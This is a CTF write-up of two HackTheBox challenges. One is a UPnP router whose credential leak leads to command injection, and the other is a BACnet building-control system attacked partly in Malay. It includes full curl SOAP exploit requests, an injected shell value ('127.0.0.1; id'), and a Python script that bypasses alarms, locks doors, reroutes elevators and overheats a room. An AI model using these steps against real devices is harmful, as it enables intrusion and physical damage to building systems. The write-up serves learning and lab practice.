---
title: HackTheBox Challenges
date: 2026-06-08
categories: [HackTheBox, Write-up]
tags: [write-up, tutorial, hackthebox]
author: Mohamad Helmi
description: "HackTheBox challenges write-up"
---
# Intro
I tried some unique challenges on HacktheBox to learn new things from it. The categories are ICS, Hardware, Reversing, and some new web exploitation techniques that I learned from it.

## Plug & Pray (Hardware)
VortexLink Networking ships the GX3000 cable gateway to thousands of homes. A penetration tester has discovered that a test unit exposes an HTTP service. VortexLink insists nothing sensitive is exposed. Prove them wrong.

### Enumeration
Paste the given IP address in the browser, and we'll see the gateway admin UI for a VortexLink GX3000 router — firmware 4.2.1-RELEASE, with UPnP/IGD active.

![Gateway UI](/assets/img/posts/2026-06-08-HackTheBox-challenges/web_page.png)

The UI gives us device context, but the real attack surface is the UPnP device description XML. Navigating to `/rootDesc.xml` reveals two registered services:

- **WANIPConnection:1** — controlURL: `/ctl/IPConn`, SCPD: `/WANIPCn.xml`
- **DiagnosticService:1** — controlURL: `/ctl/Diag`, SCPD: `/diag.xml`

![rootDesc.xml response](/assets/img/posts/2026-06-08-HackTheBox-challenges/rootDesc.png)

### Service Action Enumeration
Fetching both SCPD files lists every available SOAP action for each service.

From `/WANIPCn.xml`, WANIPConnection exposes:
- `GetExternalIPAddress`
- `GetUserName`
- `GetPassword` ← interesting

From `/diag.xml`, DiagnosticService exposes:
- `GetDeviceInfo`
- `RunNetworkTest` ← interesting, accepts a `TargetHost` parameter

### Credential Leak
`GetPassword` requires no authentication. A simple SOAP POST to `/ctl/IPConn` hands us the ISP provisioning password in plaintext.

**Request:**
```bash
curl -s -X POST http://IP:PORT/ctl/IPConn \
  -H 'Content-Type: text/xml' \
  -H 'SOAPAction: "urn:schemas-upnp-org:service:WANIPConnection:1#GetPassword"' \
  -d '<?xml version="1.0"?>
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">
  <s:Body>
    <u:GetPassword xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1">
    </u:GetPassword>
  </s:Body>
```

**Response:**

```xml
</s:Envelope>'
<?xml version="1.0" encoding="utf-8"?>
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
  <s:Body>
    <u:GetPasswordResponse xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1">
            <NewPassword>Pass</NewPassword>
    </u:GetPasswordResponse>
  </s:Body>
</s:Envelope>
```

The response contains `<NewPassword>Pass</NewPassword>`. No authentication, no rate limiting — just a free credential leak.

### Trust Boundary Pivot
Reading `diag.xml` more carefully reveals that DiagnosticService requires an `X-Diag-Key` header for authentication. The intended key is the ISP provisioning password we just leaked.

This is a classic cross-service trust boundary issue: Service A leaks a secret that Service B blindly trusts.

We confirm access by calling `GetDeviceInfo` with the key:
- X-Diag-Key: Pass
- SOAPAction: "urn:schemas-upnp-org:service:DiagnosticService:1#GetDeviceInfo"

```xml
<?xml version="1.0" encoding="utf-8"?>
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
  <s:Body>
    <u:GetDeviceInfoResponse xmlns:u="urn:schemas-upnp-org:service:DiagnosticService:1">
            <ModelName>GX3000</ModelName>
            <FirmwareVersion>4.2.1-RELEASE</FirmwareVersion>
            <Uptime>5681</Uptime>
    </u:GetDeviceInfoResponse>
  </s:Body>
</s:Envelope>  
```

HTTP 200 with device info — we're in.

### Command Injection
`RunNetworkTest` passes the `TargetHost` parameter directly to a shell command (a ping/traceroute/dns wrapper) without sanitization. This is our injection sink.

Before reading the flag, we validate RCE with a harmless payload first:

**Request:**
```bash
curl -s -X POST http://TARGET/ctl/Diag \
  -H 'Content-Type: text/xml' \
  -H 'X-Diag-Key: Gx3000@ISP#2024' \
  -H 'SOAPAction: "urn:schemas-upnp-org:service:DiagnosticService:1#RunNetworkTest"' \
  -d '<?xml version="1.0"?>
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">
  <s:Body>
    <u:RunNetworkTest xmlns:u="urn:schemas-upnp-org:service:DiagnosticService:1">
      <TargetHost>127.0.0.1; id</TargetHost>
      <TestType>ping</TestType>
    </u:RunNetworkTest>
  </s:Body>
</s:Envelope>'
```

![RCE id command output](/assets/img/posts/2026-06-08-HackTheBox-challenges/id_cmd.png)

The `id` output appears inside `<TestResult>` — RCE confirmed, running as root.

### Flag
With RCE confirmed, we read the flag directly:

```xml
<TargetHost>127.0.0.1; cat /app/flag.txt</TargetHost>
```

The flag is returned inside the `<TestResult>` tag in the SOAP response.

### Key Takeaways
This challenge demonstrates a UPnP/SOAP control-plane attack chain that is entirely protocol-driven:

1. `rootDesc.xml` exposes all service URLs and action definitions
2. An unauthenticated SOAP action leaks a credential
3. That credential is reused as an auth header in a second service
4. A user-controlled parameter in that service is passed unsanitized to a shell command

The lesson: always enumerate UPnP description XML before assuming a device exposes nothing sensitive. The admin UI is just context — the attack surface lives in the XML.

---

## Steel Mountain (ICS)

**Category:** ICS / SCADA  
**Protocol:** BACnet/IP  
**Difficulty:** Medium  

---

### Overview

Steel Mountain adalah sebuah fasiliti penyimpanan selamat yang menyimpan data kritikal pelbagai syarikat besar. Objektif cabaran ini adalah untuk **memusnahkan tape backup** di Tape Storage Room (Level 2) dengan memanipulasi sistem kawalan bangunan (BAS) melalui protokol BACnet.

---

### Recon — Baca Blueprints

Dari fail `Steel_Mountain_Blueprints.pdf`, kita dapat kenal pasti layout bangunan:

- **Level 1** — Manager Office, Meeting Room, Lobby, IT Department, Archive
- **Level 2** — **Tape Storage Room**, Office 1, Building Control, SOC ← target
- **Level 3** — Servers, Workspace

Tape Storage Room ada di **Level 2**.

---

### Enumeration — BACnet Objects

Sambung ke peranti BACnet yang telah dipasang oleh penyerang sebelum ini:

```bash
nc $TARGET
```

Pilih `1` untuk senarai semua objects. Output (diringkaskan):

| Object Name | ID | Type | Description | Present Value |
|---|---|---|---|---|
| `Temp-L2-20` | 20 | analogInput | Suhu semasa Level 2 | 19.4°C |
| `Therm-L2-21` | 21 | analogOutput | Thermostat Level 2 | 19.0 |
| `ACS-L2-22` | 22 | binaryOutput | AC Level 2 [0:OFF, 1:ON] | 1 |
| `OHAP-L2-23` | 23 | analogOutput | Overheat Alarm Point FL-2 (25°C) | 25 |
| `OHA-L2-24` | 24 | binaryInput | Alarm [0:OFF, 1:ON] | 0 |
| `L2-TSR-DR` | 102 | multiStateOutput | Pintu TSR [0:OPEN, 1:CLOSED, 2:LOCKED] | 1 |
| `ELE-1-TF` | 82 | analogOutput | Elevator 1 target floor | 1 |
| `ELE-2-TF` | 85 | analogOutput | Elevator 2 target floor | 3 |
| `AHU1` | 201 | multiStateInput | Roof AHU [0:OFF, 1:COOLING, 2:WARMING] | 1 |
| `AHU2` | 202 | multiStateInput | Roof AHU [0:OFF, 1:COOLING, 2:WARMING] | 1 |

#### ⚠️ Penemuan Penting

`OHAP-L2-23` (Overheat Alarm Point) ditetapkan pada **25°C** — ini bermakna alarm akan berbunyi jika suhu melebihi 25°C. Tapes perlu dibakar pada **32°C**, jadi kita **mesti naikkan threshold alarm ini dulu** sebelum set suhu.

Format write command:
```
object_type object_id presentValue value
```

---

### Exploitation

#### Step 1 — Kunci Pintu Tape Storage Room

Lock pintu supaya tiada sesiapa boleh masuk semula:

```
>> 3
analogOutput 23 presentValue 9999
```
*(Naikkan alarm point dulu ke nilai tinggi supaya alarm tak trigger)*

```
>> 3
multiStateOutput 102 presentValue 2
```

Verify:
```
>> 2
multiStateOutput 102 presentValue
```
Output: `presentValue: 2` → **CLOSED-LOCKED** ✓

#### Step 2 — Halang Elevator Berhenti di Level 2

Selepas pintu dikunci, blok kedua-dua elevator dari berhenti di Level 2 dengan set target floor ke lantai lain:

```
>> 3
analogOutput 82 presentValue 3
```

```
>> 3
analogOutput 85 presentValue 3
```

Kedua-dua elevator kini diarahkan ke Level 3, bukan Level 2.

#### Step 3 — Bakar Tapes (Set Suhu 32°C)

**3a. Matikan AC Level 2** supaya suhu boleh naik:

```
>> 3
binaryOutput 22 presentValue 0
```

**3b. Set AHU ke mod pemanasan:**

```
>> 3
multiStateInput 201 presentValue 2
```

```
>> 3
multiStateInput 202 presentValue 2
```

**3c. Set thermostat Level 2 ke 32°C:**

```
>> 3
analogOutput 21 presentValue 32
```

Pantau suhu semasa dengan `bacnet.read` atau `objects` — tunggu `Temp-L2-20` mencapai **≥ 32°C** dan kekalkan selama **2 minit**.

---

### Automation (Python Script)

Untuk kekalkan suhu pada 32°C secara konsisten (sistem mungkin ada auto-recovery), gunakan script yang menghantar write commands berulang kali:

```python
import socket
import time

HOST = "IP"
PORT = port

def write(obj_type, obj_id, value):
    s = socket.socket()
    s.settimeout(2)
    s.connect((HOST, PORT))
    s.recv(4096)
    s.sendall(b"3\n")
    s.recv(4096)
    s.sendall(f"{obj_type} {obj_id} presentValue {value}\n".encode())
    s.close()

# Raise alarm threshold
write("analogOutput", 23, 9999)

# Lock door
write("multiStateOutput", 102, 2)

# Block elevators
write("analogOutput", 82, 3)
write("analogOutput", 85, 3)

# Disable AC
write("binaryOutput", 22, 0)

# Set AHU to warming
write("multiStateInput", 201, 2)
write("multiStateInput", 202, 2)

# Hammer thermostat at 32°C
for _ in range(60):
    write("analogOutput", 21, 32)
    time.sleep(0.1)

print("Done — check dashboard for flag")
```

---

### Flag

Selepas suhu Level 2 mencapai dan kekal pada ≥ 32°C selama 2 minit, flag akan muncul pada dashboard web (`IP:PORT`) dalam objek `Message` (ObjectID 500).

```
HTB{...}
```

---

### Lessons Learned

1. **BACnet tidak ada authentication secara default** — sesiapa yang ada network access boleh baca dan tulis semua objects.
2. **Alarm bypass adalah kunci** — overheat alarm point (`OHAP`) perlu dinaikkan dulu sebelum manipulasi suhu, atau alarm akan reset sistem.
3. **System auto-recovery** — sistem mungkin ada watchdog yang reset nilai secara berkala, jadi perlu "hammer" commands berulang kali.
4. **Blueprint recon penting** — tanpa blueprint, kita tak tahu Tape Storage Room ada di Level 2 dan tak tahu target object mana yang perlu dimanipulasi.

---

### Tools Used

- `netcat` — interaksi terus dengan BACnet device
- `Python socket` — automasi write commands
- Blueprint PDF — identifikasi lokasi Tape Storage Room